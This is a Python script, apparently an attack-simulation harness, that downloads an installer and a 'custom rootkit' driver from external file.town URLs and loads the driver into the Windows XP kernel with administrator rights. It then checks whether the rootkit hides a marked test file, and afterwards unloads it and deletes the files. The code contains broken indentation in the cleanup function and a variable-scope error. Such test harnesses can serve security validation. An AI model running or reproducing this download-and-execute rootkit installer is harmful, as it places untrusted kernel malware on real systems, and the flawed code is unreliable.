import os
import requests
import subprocess
import argparse

def print_attack_preconditions():
    print("***--------------------[Pre-Conditions]----------------------***")
    print("[Operating System]: Windows XP SP2 or SP3")
    print("[Permission]: Script is running as Administrator")
    print("[Dependencies]: Python 3.4:  https://www.python.org/ftp/python/3.4.3/python-3.4.3.msi, requests module: python -m pip install requests")
    print("----------------------------------------------------------------")

def setup_attack_testspace():
    # make a directory containing two files
    # TEST_FOLDER:
    #   TD_SECDEV_RETAINED_testfile.txt
    #   TD_SECDEV_REMOVED_testfile.txt
    print("***-----------------[Creating Test folder and files]---------------***")
    print("     [STATUS]: Creating test folder: TESTFOLDER...")
    os.mkdir("TESTFOLDER")
    print("     [STATUS]: Test folder created")
    print("     [STATUS]: Creating files...")
    with open("./TESTFOLDER/TD_SECDEV_RETAINED_testfile.txt", "w+") as ret,  open("./TESTFOLDER/TD_SECDEV_REMOVED_testfile.txt", "w+") as rem:
        for i in range(0, 10):
            ret.write("This is line %d\r\n" % (i+1))
            rem.write("This is line %d\r\n" % (i+1))
    print("     [STATUS]: Test files created")
    print("-----------------------------------------------------------------------")

def launch_attack(download_required):
    # download the driver and installation tool file hosted on file.town
    if not download_required:
        print("***---------------------[Begin attack]------------------------------***")
        print("     [Status]: Downloading instdrv.exe, rootkit.sys...")
        
        # using the InstDrv tool
        launcher = requests.get("https://file.town/uploads/4ovz0h19ykpbubx47arsvglrs.EXE", stream=True)
        # using custom rootkit
        driver = requests.get("https://file.town/uploads/hsb271nd3sael8f2ad75rnua8.sys", stream=True)
        with open("instdrv.exe", "wb") as exe, open("rootkit.sys", "wb") as sys:
            for data in launcher.iter_content(chunk_size=128):
                exe.write(data)
            for data in driver.iter_content(chunk_size=128):
                sys.write(data)
        print("     [Status]: Finished downloading instdrv.exe")
    
    if (not os.path.exists("instdrv.exe") or not os.path.exists("rootkit.sys")):
        undo_attack(False)
        print("     [STATUS][ERROR]: Attack dependencies rootkit.sys and instdrv.exe NOT FOUND")
        exit(1)
    
    # execute the file from the commandline
    print("     [Status]: Executing instdrv.exe ...")
    retcode = subprocess.call(["instdrv.exe", "/i", "/s", "rootkit.sys"])
    print("     [Status]: instdrv.exe completed with status %d" % retcode)
    print("------------------------------------------------------------------------")

def verify_attack():
    print_attack_postconditions()
    print("***------------------[Begin attack verification]---------------------***")
    print("You can manually verify the rootkit by browsing the TD_SECDEV_TESTFOLDER")
    input("Press ENTER key to continue automation... ")
    # iter through the files in the directory and test for files and folder found
    listed_files = os.listdir("./TESTFOLDER/")
    for filename in listed_files:
        if filename == "TD_SECDEV_RETAINED_testfile.txt":
            print("     [STATUS][SUCCESS]: %s: EXISTS as expected" % filename)
        elif filename == "TD_SECDEV_REMOVED_testfile.txt":
            print("     [STATUS][FAILURE]: %s: File SHOULD NOT exist" % filename)
    if "TD_SECDEV_RETAINED_testfile.txt" not in listed_files:
        print("     [STATUS][FAILURE]: %s: File SHOULD exist" % filename)
    
    if "TD_SECDEV_REMOVED_testfile.txt" not in listed_files:
        print("     [STATUS][SUCCESS]: %s: DOES NOT EXIST as expected" % filename)
    
    print("--------------------------------------------------------------------------")


def print_attack_postconditions():
    print("***----------------------[PostConditions]----------------------------***")
    print("[Expecting the following files in the test_directory to NO LONGER EXIST]")
    print("[    : TD_SECDEV_REMOVED_testfile]")
    print("[Expecting the following files in the test_directory to STILL EXIST]")
    print("[    : TD_SECDEV_REMAINED_testfile]")
    print("------------------------------------------------------------------------")

def undo_attack(rm_rootkit=True):
    # uninstall the rootkit
    print("***-------------------------[UNDO ATTACK]----------------------------***")
    if rm_rootkit:
        print("     [STATUS]: Begin rootkit.sys unloading...")
        subprocess.call(["instdrv.exe", "/u", "/s", "rootkit.sys"])
        print("     [STATUS]: rootkit.sys unloaded from NT Kernel")
    
    # delete the files and eventually the directory
    print("     [STATUS]: Begin TESTFOLDER removal...")
    files = os.listdir("./TESTFOLDER/")
    for filename in files:
        os.remove("./TESTFOLDER/" + filename)
        print("     [STATUS]: " + filename + " removed")
    # remove the directory
    os.rmdir("./TESTFOLDER/")
    print("     [STATUS]: TESTFOLDER removed")

# remove the driver and installer files
print("     [STATUS]: Removing system file and installer...")
    os.remove("./instdrv.exe")
    os.remove("./rootkit.sys")
    print("     [STATUS]: instdrv.exe and rootkit.sys removed")
    print("------------------------------------------------------------------------")

def verify_undo_attack():
    # test that the dowloaded and extracted files no longer exists
    print("***--------------------[Verifying Cleanup]---------------------------***")
    if not os.path.exists("./instdrv.exe") and not os.path.exists("./rootkit.sys") and not os.path.exists("./TESTFOLDER/"):
        print("     [Status]: Cleanup Successful!")
    else:
        print("     [Status]: Cleanup Failed")
    print("***--------------------[Automation Completed]------------------------***")

def help():
    # display the pre-conditions and post-conditions
    print_attack_preconditions()
    print_attack_postconditions()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--local", help="Use these options if instdrv.exe and rootkit.sys need not be downloaded", action="store_true")
    parser.add_argument("-c", "--conditions", help="Show Pre/Post conditions and exit", action="store_true")
    args = parser.parse_args()
    if args.conditions:
        help()
        exit(0)
    setup_attack_testspace()
    launch_attack(args.local)
    verify_attack()
    undo_attack()
    verify_undo_attack()

